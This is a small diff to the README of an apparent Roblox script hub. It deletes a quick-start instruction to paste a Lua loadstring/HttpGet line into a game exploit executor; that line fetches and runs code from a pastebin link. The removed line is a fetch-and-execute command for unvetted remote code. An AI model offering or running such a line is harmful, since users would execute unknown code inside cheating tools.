@@ -19,10 +19,7 @@
 
 ## 📥 Quick Start template (Recommended to understandl uaz)
 
-Copy this script and paste it into your executor (Delta, Fluxus, Hydrogen, Synapse X, etc.) to run the hub instantly.
-
-```lua
-loadstring(game:HttpGet("[https://pastebin.com/raw/npm0hY99](https://pastebin.com/raw/npm0hY99)"))()
+your executor (Delta, Fluxus, Hydrogen, Synapse X, etc.) to run the hub 
 
 ##luaz structure 
 
